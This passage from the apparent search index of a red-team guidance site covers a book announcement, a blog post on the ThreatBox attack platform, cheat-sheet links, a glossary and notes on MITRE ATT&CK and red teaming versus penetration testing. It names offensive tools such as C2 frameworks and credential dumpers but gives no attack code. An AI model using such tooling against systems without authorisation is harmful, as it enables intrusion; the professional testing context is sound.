deliver, and perform professional Red Team engagements of all sizes and complexities. One of our first formal attempts to capture this information was the SANS SEC564 Red Team Operation and Threat Emulation course. This first effort was an attempt to document the concepts in a format usable by others. Although, the SANS course was extremely successful and received highly rated reviews, we have moved on from SANS training and have completed this book to detail Red Team operations in an easily maintainable and digestible format. It has taken years of research, experimentation (a.k.a trial-and-error), and execution to discern what elements should and should not be part of this text. Our goal was to provide practical guidance to assist you (or your team) in the development, management, and execution of a professional Red Team. Volumes upon volumes could be written on each individual topic; however, we have attempted to write to the 80/20 rule. Eighty (80) percent of what you see, hear, and experience is the least valuable information. This book covers what we believe to be the twenty (20) percent of Red Team Development and Operations that has the most value. It will not only make you a better Red Teamer, but it should also provide a means to streamline your efforts and alleviate your work-load. In the end, improving (making things better) and enjoying yourself in the process is what counts the most. The first release is our \"zero-day\" edition. We want to get this book in the public space. It will be updated as needed. The book has a companion website, https://redteam.guide . This website contains tips, templates, and other extras that help develop or run a Red Team. Self published on Amazon \u00b6 Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition ( \"Red Team Development and Operations\", Zero-Day Edition ) Joe Vest ( @joevest ) and James Tubberville ( @minis_io )","title":"Red Team Development and Operations"},{"location":"blogs/2020/red-team-development-and-operations/#red-team-development-and-operations-book","text":"James Tubberville | January 20, 2020 | Tweet This Post: \"Red Team Development and Operations\", Zero-Day Edition Joe Vest ( @joevest ) and James Tubberville ( @minis_io ) We are excited to announce the release of our new book","title":"Red Team Development and Operations Book"},{"location":"blogs/2020/red-team-development-and-operations/#red-team-development-and-operations","text":"This book is the culmination of years of experience in the information technology and cybersecurity field. Components of the book have existed as rough notes, ideas, informal and formal processes developed and/or adopted by the authors as we led and executed Red Team engagements over many years. These components have been used to successfully plan, deliver, and perform professional Red Team engagements of all sizes and complexities. One of our first formal attempts to capture this information was the SANS SEC564 Red Team Operation and Threat Emulation course. This first effort was an attempt to document the concepts in a format usable by others. Although, the SANS course was extremely successful and received highly rated reviews, we have moved on from SANS training and have completed this book to detail Red Team operations in an easily maintainable and digestible format. It has taken years of research, experimentation (a.k.a trial-and-error), and execution to discern what elements should and should not be part of this text. Our goal was to provide practical guidance to assist you (or your team) in the development, management, and execution of a professional Red Team. Volumes upon volumes could be written on each individual topic; however, we have attempted to write to the 80/20 rule. Eighty (80) percent of what you see, hear, and experience is the least valuable information. This book covers what we believe to be the twenty (20) percent of Red Team Development and Operations that has the most value. It will not only make you a better Red Teamer, but it should also provide a means to streamline your efforts and alleviate your work-load. In the end, improving (making things better) and enjoying yourself in the process is what counts the most. The first release is our \"zero-day\" edition. We want to get this book in the public space. It will be updated as needed. The book has a companion website, https://redteam.guide . This website contains tips, templates, and other extras that help develop or run a Red Team.","title":"Red Team Development and Operations"},{"location":"blogs/2020/red-team-development-and-operations/#self-published-on-amazon","text":"Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition ( \"Red Team Development and Operations\", Zero-Day Edition ) Joe Vest ( @joevest ) and James Tubberville ( @minis_io )","title":"Self published on Amazon"},{"location":"blogs/2020/threatbox-standard-attack-platform/","text":"ThreatBox - Standard Attack Platform \u00b6 James Tubberville | February 28, 2020 | Tweet This Post: threatbox Security testers need a mixed set of tools. Some in the penetration testing and red teaming community argue that you shouldn't be limited to a specific set of tools. A threat can use anything they desire, right? This is true, but we are not the threat. We are part of the professional security testing community. Security testers shouldn't be limited to a specific set of tools, but downloading and using something randomly found on the internet is risky. A balance is needed. This balance is one way to separate security professionals from those who 'hack stuff.' We need a standard process to control the tools we use that are flexible enough to provide the capability we need with some assurances around the codebase. This can be achieved through a standard attack platform. A standard attack platform is the common set of tools and hardware used by security testers, like a Red Team, to perform an engagement. The term standard is critical. A standard platform allows for \u00b6 Better logging \u00b6 A common platform shares the same base build, directory structure, and built-in data capture capability. At a minimum, tracks and logs terminal commands. Better logging equals better engagement. Easier deconfliction \u00b6 A common set of tools and payloads, along with a standard logging process, can help an organization quickly work through the deconfliction process. ( https://redteam.guide/docs/definition-lexicon/#deconfliction ) Common baseline \u00b6 A universal base provides a stable, functional environment for a Red Team to operate. Consistency means more efficient operators. Access to a better toolset \u00b6 A standard platform is designed using the knowledge of many people. Multiple senior team members can contribute their best tools, references, and guides. This raises the overall capability of a team by including expertise in the toolbox. Junior operators can utilize more sophisticated tools or techniques that often only exist in someone's head. Custom tools work across attack platforms \u00b6 Red Teams and security testers often build custom tools. If these tools are developed to a common base, like a standard attack platform, they will work for all operators. Tools should just work, no more fighting installation of dependencies or \u201cit works on my box\u201d. Tool vetting \u00b6 In some cases, Blue Teams or customers require red team tools to be vetted as threat faithful or provide assurance tools have no unknown malicious risk. When using a standard attack platform, a tool vetting process can be used before including a tool to the toolbox. This ensures all tools are managed and validated before use. Tool validation often occurs due to fear that the Red Team tools may cause unexpected damage to a system Demonstrating active control of a toolset is a way to professionalism and reduce fears that may arise during security tests. Consistent processes \u00b6 Using a common baseline enables a standard set of procedures that allow the skills and knowledge of senior operators to be used by junior operators. This can significantly enhance an engagement's success and better use of limited resources. Using a standard platform does not mean limiting the toolset. If a tool or capability is required, make it part of the platform, and document its inclusion. If an operator needs a new tool or unique ability for an engagement, use it. The standard attack platform is a common base meant to provide a stable and functional environment for Red Team operators or security testers to operate. It is not designed to limit the Red Team. TLDR: Be a security professional. Control the tools you use. ![Red Team Guide][ http://redteam.guide ] Details on the concept of a Standard Attack Platform and other Red Teaming topics can be found in the book Red Team Development and Operations - A practical guide, written by Joe Vest and James Tubberville. ThreatBox \u00b6 threatbox ThreatBox is a standard and controlled Linux based attack platform. I've used a version of this for years. It started as a collection of scripts, lived as a rolling virtual machine, existed as code to build a Linux ISO, and has now been converted to a set of ansible playbooks. Why Ansible? Why not? This seemed to be the next natural evolution to the configuration of standard attack platforms. Provisioning in the Cloud This project uses Ansible playbooks and roles to perform post-deployment configuration on a Linux target. It was tested on Ubuntu 18.04 provisioned in Digitalocean. Provisioning security testing boxes to cloud services providers is a personal preference determined by your own risk factors. Cloud provisioning is not required but does demonstrate the the system deployment side of DevOps. This project will not provision your target systems. This set of playbooks can be run against a Linux box you control (local or remote). It is designed to be used as a starter process in creating, managing, and using a standard attack platform for red teaming or penetration testing. A few features: Standard tools defined as ansible roles GUI access via VNC over SSH Customizations designed to make security testing easier Variable driven to easily add or remove git repositories, OS packages, or python modules. (threatbox.yml) Version tracking of the deployed instance version and deployed tool versions. Version tracking helps meet compliance requirements and can help minimize fear by actively tracking all tools. Deployed software tracked in ~/Desktop/readme SSH port auto-switching. Deployment begins on SSH port 22, but reconfigures the target system to the desired SSH port using the ansible_port variable in threatbox . yml Download and locally compile several .net toolkits (i.e., SeatBelt.exe from Ghostpack https://github.com/GhostPack/Seatbelt ) Python projects installed using pipenv to reduce dependency conflict. Use pipenv shell in the project directory to access. See https://realpython.com/pipenv-guide/ for pipenv usage guidance Here are a few tools installed and ready for use: C2 crackmapexec Metasploit Covenant Merlin Silenttrinity Web BurpSuite Eyewitness sqlmap tinyshell GhostPack Safetykatz Seatbelt Sharpdpapi Sharpdump Sharpup Sharpwmi Screenshots \u00b6 Connect to the GUI via VNC over SSH 1 2 threatboxip = 10 .10.10.10 ssh -p52222 -i ~/.ssh/threatbox_id_rsa -L 5901 :localhost:5901 root@ $threatboxip VNC over SSH ThreatBox Tracking of installed tools Custom terminal options provide more context Light version of the terminal Attack platform custom commands Automatic logging of terminals Tool categories Pipenv used to control python projects Red Team Development and Operations \u00b6 Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition Companion site. https://redteam.guide/ Find the book on Barnes & Noble. https://www.barnesandnoble.com/w/red-team-development-and-operations-james-tubberville/1136264411?ean=9798601431828 Joe Vest ( @joevest ) and James Tubberville ( @minis_io )","title":"ThreatBox - Standard Attack Platform"},{"location":"blogs/2020/threatbox-standard-attack-platform/#threatbox-standard-attack-platform","text":"James Tubberville | February 28, 2020 | Tweet This Post: threatbox Security testers need a mixed set of tools. Some in the penetration testing and red teaming community argue that you shouldn't be limited to a specific set of tools. A threat can use anything they desire, right? This is true, but we are not the threat. We are part of the professional security testing community. Security testers shouldn't be limited to a specific set of tools, but downloading and using something randomly found on the internet is risky. A balance is needed. This balance is one way to separate security professionals from those who 'hack stuff.' We need a standard process to control the tools we use that are flexible enough to provide the capability we need with some assurances around the codebase. This can be achieved through a standard attack platform. A standard attack platform is the common set of tools and hardware used by security testers, like a Red Team, to perform an engagement. The term standard is critical.","title":"ThreatBox - Standard Attack Platform"},{"location":"blogs/2020/threatbox-standard-attack-platform/#a-standard-platform-allows-for","text":"","title":"A standard platform allows for"},{"location":"blogs/2020/threatbox-standard-attack-platform/#better-logging","text":"A common platform shares the same base build, directory structure, and built-in data capture capability. At a minimum, tracks and logs terminal commands. Better logging equals better engagement.","title":"Better logging"},{"location":"blogs/2020/threatbox-standard-attack-platform/#easier-deconfliction","text":"A common set of tools and payloads, along with a standard logging process, can help an organization quickly work through the deconfliction process. ( https://redteam.guide/docs/definition-lexicon/#deconfliction )","title":"Easier deconfliction"},{"location":"blogs/2020/threatbox-standard-attack-platform/#common-baseline","text":"A universal base provides a stable, functional environment for a Red Team to operate. Consistency means more efficient operators.","title":"Common baseline"},{"location":"blogs/2020/threatbox-standard-attack-platform/#access-to-a-better-toolset","text":"A standard platform is designed using the knowledge of many people. Multiple senior team members can contribute their best tools, references, and guides. This raises the overall capability of a team by including expertise in the toolbox. Junior operators can utilize more sophisticated tools or techniques that often only exist in someone's head.","title":"Access to a better toolset"},{"location":"blogs/2020/threatbox-standard-attack-platform/#custom-tools-work-across-attack-platforms","text":"Red Teams and security testers often build custom tools. If these tools are developed to a common base, like a standard attack platform, they will work for all operators. Tools should just work, no more fighting installation of dependencies or \u201cit works on my box\u201d.","title":"Custom tools work across attack platforms"},{"location":"blogs/2020/threatbox-standard-attack-platform/#tool-vetting","text":"In some cases, Blue Teams or customers require red team tools to be vetted as threat faithful or provide assurance tools have no unknown malicious risk. When using a standard attack platform, a tool vetting process can be used before including a tool to the toolbox. This ensures all tools are managed and validated before use. Tool validation often occurs due to fear that the Red Team tools may cause unexpected damage to a system Demonstrating active control of a toolset is a way to professionalism and reduce fears that may arise during security tests.","title":"Tool vetting"},{"location":"blogs/2020/threatbox-standard-attack-platform/#consistent-processes","text":"Using a common baseline enables a standard set of procedures that allow the skills and knowledge of senior operators to be used by junior operators. This can significantly enhance an engagement's success and better use of limited resources. Using a standard platform does not mean limiting the toolset. If a tool or capability is required, make it part of the platform, and document its inclusion. If an operator needs a new tool or unique ability for an engagement, use it. The standard attack platform is a common base meant to provide a stable and functional environment for Red Team operators or security testers to operate. It is not designed to limit the Red Team. TLDR: Be a security professional. Control the tools you use. ![Red Team Guide][ http://redteam.guide ] Details on the concept of a Standard Attack Platform and other Red Teaming topics can be found in the book Red Team Development and Operations - A practical guide, written by Joe Vest and James Tubberville.","title":"Consistent processes"},{"location":"blogs/2020/threatbox-standard-attack-platform/#threatbox","text":"threatbox ThreatBox is a standard and controlled Linux based attack platform. I've used a version of this for years. It started as a collection of scripts, lived as a rolling virtual machine, existed as code to build a Linux ISO, and has now been converted to a set of ansible playbooks. Why Ansible? Why not? This seemed to be the next natural evolution to the configuration of standard attack platforms. Provisioning in the Cloud This project uses Ansible playbooks and roles to perform post-deployment configuration on a Linux target. It was tested on Ubuntu 18.04 provisioned in Digitalocean. Provisioning security testing boxes to cloud services providers is a personal preference determined by your own risk factors. Cloud provisioning is not required but does demonstrate the the system deployment side of DevOps. This project will not provision your target systems. This set of playbooks can be run against a Linux box you control (local or remote). It is designed to be used as a starter process in creating, managing, and using a standard attack platform for red teaming or penetration testing. A few features: Standard tools defined as ansible roles GUI access via VNC over SSH Customizations designed to make security testing easier Variable driven to easily add or remove git repositories, OS packages, or python modules. (threatbox.yml) Version tracking of the deployed instance version and deployed tool versions. Version tracking helps meet compliance requirements and can help minimize fear by actively tracking all tools. Deployed software tracked in ~/Desktop/readme SSH port auto-switching. Deployment begins on SSH port 22, but reconfigures the target system to the desired SSH port using the ansible_port variable in threatbox . yml Download and locally compile several .net toolkits (i.e., SeatBelt.exe from Ghostpack https://github.com/GhostPack/Seatbelt ) Python projects installed using pipenv to reduce dependency conflict. Use pipenv shell in the project directory to access. See https://realpython.com/pipenv-guide/ for pipenv usage guidance Here are a few tools installed and ready for use: C2 crackmapexec Metasploit Covenant Merlin Silenttrinity Web BurpSuite Eyewitness sqlmap tinyshell GhostPack Safetykatz Seatbelt Sharpdpapi Sharpdump Sharpup Sharpwmi","title":"ThreatBox"},{"location":"blogs/2020/threatbox-standard-attack-platform/#screenshots","text":"Connect to the GUI via VNC over SSH 1 2 threatboxip = 10 .10.10.10 ssh -p52222 -i ~/.ssh/threatbox_id_rsa -L 5901 :localhost:5901 root@ $threatboxip VNC over SSH ThreatBox Tracking of installed tools Custom terminal options provide more context Light version of the terminal Attack platform custom commands Automatic logging of terminals Tool categories Pipenv used to control python projects","title":"Screenshots"},{"location":"blogs/2020/threatbox-standard-attack-platform/#red-team-development-and-operations","text":"Paperback - \"Red Team Development and Operations\", Zero-Day Edition eBook - \"Red Team Development and Operations\", Zero-Day Edition Companion site. https://redteam.guide/ Find the book on Barnes & Noble. https://www.barnesandnoble.com/w/red-team-development-and-operations-james-tubberville/1136264411?ean=9798601431828 Joe Vest ( @joevest ) and James Tubberville ( @minis_io )","title":"Red Team Development and Operations"},{"location":"redteaming/cheatsheets/","text":"Cheat Sheets \u00b6 Red Team Cheat Sheets \u00b6 @harmj0y Red Team Cheat Sheets CobaltStrike Beacon PowerShell Empire PowerSploit PowerView PowerUp Windows Active Directory \u00b6 A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts PowerView \u00b6 Make PowerView Great Again SANS Cheat Sheets \u00b6 PowerShell Windows Command Line Blue Teaming Cheat Sheets \u00b6 SANS Blue Team Wiki Powershell Cheat Sheets \u00b6 PowerShell Bloodhound \u00b6 DogWhisperer - BloodHound Cypher Cheat Sheet - https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md","title":"Cheatsheets"},{"location":"redteaming/cheatsheets/#cheat-sheets","text":"","title":"Cheat Sheets"},{"location":"redteaming/cheatsheets/#red-team-cheat-sheets","text":"@harmj0y Red Team Cheat Sheets CobaltStrike Beacon PowerShell Empire PowerSploit PowerView PowerUp","title":"Red Team Cheat Sheets"},{"location":"redteaming/cheatsheets/#windows-active-directory","text":"A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts","title":"Windows Active Directory"},{"location":"redteaming/cheatsheets/#powerview","text":"Make PowerView Great Again","title":"PowerView"},{"location":"redteaming/cheatsheets/#sans-cheat-sheets","text":"PowerShell Windows Command Line","title":"SANS Cheat Sheets"},{"location":"redteaming/cheatsheets/#blue-teaming-cheat-sheets","text":"SANS Blue Team Wiki","title":"Blue Teaming Cheat Sheets"},{"location":"redteaming/cheatsheets/#powershell-cheat-sheets","text":"PowerShell","title":"Powershell Cheat Sheets"},{"location":"redteaming/cheatsheets/#bloodhound","text":"DogWhisperer - BloodHound Cypher Cheat Sheet - https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md","title":"Bloodhound"},{"location":"redteaming/definitions/","text":"Definitions \u00b6 Blue Cell \u00b6 The blue cell is the opposite side of red. Is it all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization\u2019s management. Blue Team \u00b6 A security team that defends against threats. Command and Control (C2) \u00b6 Command and Control (C2) is the influence an attacker has over a compromised computer system that they control. Engagement / Exercise Control Group (ECG) \u00b6 The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted during the engagement. Most often, the Engagement Control Group is composed of one or two senior managers from the target environment (for example a Chief Information Officer or Chief Operating Officer), one member from the Information Technology department of the environment, a White Cell liaison, and a Red Team liaison. More may be added as required. All must be Trusted Agents. Exfiltration \u00b6 Exfiltration is the extraction of information from a target. This is typically through a covert channel. IOC (Indicator of Compromise) \u00b6 Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions. OPFOR \u00b6 An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios. Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios. Operational Impact \u00b6 An operational impact is the effect of a goal-driven action within a target environment. OPSEC \u00b6 OPSEC or Operational Security is a process that identifies critical information to determine if friendly actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and then executes selected measures that eliminate or reduce adversary exploitation of friendly critical information. In terms of Red Teaming, it is understanding what actions Blue can observe and minimizes exposure. Red Cell \u00b6 The term red cell is borrowed from the military. It is commonly associated with a group that plays OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the offensive portion of a red team engagement that simulates the strategic and tactical responses of a given target. The red cell is typically comprised of red team leads and operators and is commonly referred to as Red Team instead of Red Cell. Red Team \u00b6 A Red Team is an independent group that, from the perspective of a threat or adversary, explores alternative plans and operations to challenge an organizatio\u00f8n to improve its effectiveness. Red Team Lead \u00b6 Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget, and resource management for the Red Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures adherence to all laws, regulations, policies, and Rules of Engagement. Red Team Operator \u00b6 Complies with all Red Team requirements under the direction of the Red Team Lead. Operational executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides log and information support for creation of the final report ROE (Rules of Engagement) \u00b6 The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red Team, the customer, the system owner, and any stakeholders required for engagement execution. Threat \u00b6 A threat is an expression of intention to inflict evil, injury, or damage. Threat Emulation Threat Emulation is the process of mimicking the TTPs of a specific threat. Tradecraft \u00b6 Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the intelligence community. TTPs and Tradecraft are used interchangeably in this course. Trusted Agent (TA) \u00b6 The Trusted Agent\u2019s primary role is to limit irreversible damage and risk to life, limb, eyesight, and equipment; however, they are more often used to prevent the defenders from causing unexpected self-inflicted damage. A Trusted Agent (TA) has privileged and detailed knowledge of engagement activities, milestones, conditions, and the engagement status that would unduly bias or influence the actions of the environment staff and defenders. A Trusted Agent must protect all information from being provided to any party without the express approval of the Engagement Control Group. TTPs \u00b6 TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures). White Cell \u00b6 Serves as referee between Red Team activities and defender responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates Red Team activities with defensive actions. Ensures the engagement is conducted without bias to either side.","title":"Definitions"},{"location":"redteaming/definitions/#definitions","text":"","title":"Definitions"},{"location":"redteaming/definitions/#blue-cell","text":"The blue cell is the opposite side of red. Is it all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization\u2019s management.","title":"Blue Cell"},{"location":"redteaming/definitions/#blue-team","text":"A security team that defends against threats.","title":"Blue Team"},{"location":"redteaming/definitions/#command-and-control-c2","text":"Command and Control (C2) is the influence an attacker has over a compromised computer system that they control.","title":"Command and Control (C2)"},{"location":"redteaming/definitions/#engagement-exercise-control-group-ecg","text":"The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted during the engagement. Most often, the Engagement Control Group is composed of one or two senior managers from the target environment (for example a Chief Information Officer or Chief Operating Officer), one member from the Information Technology department of the environment, a White Cell liaison, and a Red Team liaison. More may be added as required. All must be Trusted Agents.","title":"Engagement / Exercise Control Group (ECG)"},{"location":"redteaming/definitions/#exfiltration","text":"Exfiltration is the extraction of information from a target. This is typically through a covert channel.","title":"Exfiltration"},{"location":"redteaming/definitions/#ioc-indicator-of-compromise","text":"Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions.","title":"IOC (Indicator of Compromise)"},{"location":"redteaming/definitions/#opfor","text":"An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios. Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios.","title":"OPFOR"},{"location":"redteaming/definitions/#operational-impact","text":"An operational impact is the effect of a goal-driven action within a target environment.","title":"Operational Impact"},{"location":"redteaming/definitions/#opsec","text":"OPSEC or Operational Security is a process that identifies critical information to determine if friendly actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and then executes selected measures that eliminate or reduce adversary exploitation of friendly critical information. In terms of Red Teaming, it is understanding what actions Blue can observe and minimizes exposure.","title":"OPSEC"},{"location":"redteaming/definitions/#red-cell","text":"The term red cell is borrowed from the military. It is commonly associated with a group that plays OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the offensive portion of a red team engagement that simulates the strategic and tactical responses of a given target. The red cell is typically comprised of red team leads and operators and is commonly referred to as Red Team instead of Red Cell.","title":"Red Cell"},{"location":"redteaming/definitions/#red-team","text":"A Red Team is an independent group that, from the perspective of a threat or adversary, explores alternative plans and operations to challenge an organizatio\u00f8n to improve its effectiveness.","title":"Red Team"},{"location":"redteaming/definitions/#red-team-lead","text":"Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget, and resource management for the Red Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures adherence to all laws, regulations, policies, and Rules of Engagement.","title":"Red Team Lead"},{"location":"redteaming/definitions/#red-team-operator","text":"Complies with all Red Team requirements under the direction of the Red Team Lead. Operational executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides log and information support for creation of the final report","title":"Red Team Operator"},{"location":"redteaming/definitions/#roe-rules-of-engagement","text":"The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red Team, the customer, the system owner, and any stakeholders required for engagement execution.","title":"ROE (Rules of Engagement)"},{"location":"redteaming/definitions/#threat","text":"A threat is an expression of intention to inflict evil, injury, or damage. Threat Emulation Threat Emulation is the process of mimicking the TTPs of a specific threat.","title":"Threat"},{"location":"redteaming/definitions/#tradecraft","text":"Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the intelligence community. TTPs and Tradecraft are used interchangeably in this course.","title":"Tradecraft"},{"location":"redteaming/definitions/#trusted-agent-ta","text":"The Trusted Agent\u2019s primary role is to limit irreversible damage and risk to life, limb, eyesight, and equipment; however, they are more often used to prevent the defenders from causing unexpected self-inflicted damage. A Trusted Agent (TA) has privileged and detailed knowledge of engagement activities, milestones, conditions, and the engagement status that would unduly bias or influence the actions of the environment staff and defenders. A Trusted Agent must protect all information from being provided to any party without the express approval of the Engagement Control Group.","title":"Trusted Agent (TA)"},{"location":"redteaming/definitions/#ttps","text":"TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures).","title":"TTPs"},{"location":"redteaming/definitions/#white-cell","text":"Serves as referee between Red Team activities and defender responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates Red Team activities with defensive actions. Ensures the engagement is conducted without bias to either side.","title":"White Cell"},{"location":"redteaming/mitre_attack/","text":"MITRE ATT&CK \u00b6 MITRE\u2019s Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u2122) is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary\u2019s lifecycle and the platforms they are known to target. ATT&CK is useful for understanding security risk against known adversary behavior, for planning security improvements, and verifying defenses work as expected. ATT&CK is broken into Tactics, Techniques, and Procedures Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This frameworks provides a classification of all threat actions regardless of the underlying vulnerabilities. Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to ATT&CK. ATT&CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against various TTPs. References \u00b6 Description Link ATT&CK https://attack.mitre.org/wiki/Main_Page PRE-ATT&CK https://attack.mitre.org/pre-attack/index.php/Main_Page ATT&CK Navigator https://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/the-attck%E2%84%A2-navigator-a-new-open-source ATT&CK Navigator Example https://mitre.github.io/attack-navigator/enterprise/","title":"Red Teaming and MITRE ATT&CK"},{"location":"redteaming/mitre_attack/#mitre-attck","text":"MITRE\u2019s Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK\u2122) is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary\u2019s lifecycle and the platforms they are known to target. ATT&CK is useful for understanding security risk against known adversary behavior, for planning security improvements, and verifying defenses work as expected. ATT&CK is broken into Tactics, Techniques, and Procedures Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This frameworks provides a classification of all threat actions regardless of the underlying vulnerabilities. Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to ATT&CK. ATT&CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against various TTPs.","title":"MITRE ATT&amp;CK"},{"location":"redteaming/mitre_attack/#references","text":"Description Link ATT&CK https://attack.mitre.org/wiki/Main_Page PRE-ATT&CK https://attack.mitre.org/pre-attack/index.php/Main_Page ATT&CK Navigator https://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/the-attck%E2%84%A2-navigator-a-new-open-source ATT&CK Navigator Example https://mitre.github.io/attack-navigator/enterprise/","title":"References"},{"location":"redteaming/red_vs_pen_vs_vuln/","text":"Red Teaming VS Penetration Testing VS Vulnerability Testing \u00b6 A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition: Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using realistic techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Red Teaming in Perspective to Organizational Risk \u00b6 Security testing of any sort is ultimately about managing organization risk to threats. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT. Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessments are good at reducing the attack surface but do not provide direct information in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target\u2019s attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red Team Engagements are scenario based engagements driven by specific threat goals. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat\u2019s ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization\u2019s operations or how security operations was able to impact a threat\u2019s ability to operate. Bottom Line \u00b6 Vulnerability assessment and Penetration tests are a means to identify technical flaws with the ultimate goal of reducing a targets attack surface. Red teaming is a goal driven scenario used to train or measure blue. Red teaming goals lie in understanding security operations as a whole. people, processes, and technology. References \u00b6 Threat Gets a Vote - Applying a threat-based approach to security testing","title":"Red vs Pen vs Vuln"},{"location":"redteaming/red_vs_pen_vs_vuln/#red-teaming-vs-penetration-testing-vs-vulnerability-testing","text":"A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition: Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using realistic techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target.","title":"Red Teaming VS Penetration Testing VS Vulnerability Testing"},{"location":"redteaming/red_vs_pen_vs_vuln/#red-teaming-in-perspective-to-organizational-risk","text":"Security testing of any sort is ultimately about managing organization risk to threats. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT. Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessments are good at reducing the attack surface but do not provide direct information in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target\u2019s attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red Team Engagements are scenario based engagements driven by specific threat goals. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat\u2019s ability to operate. Technical flaws are secondary 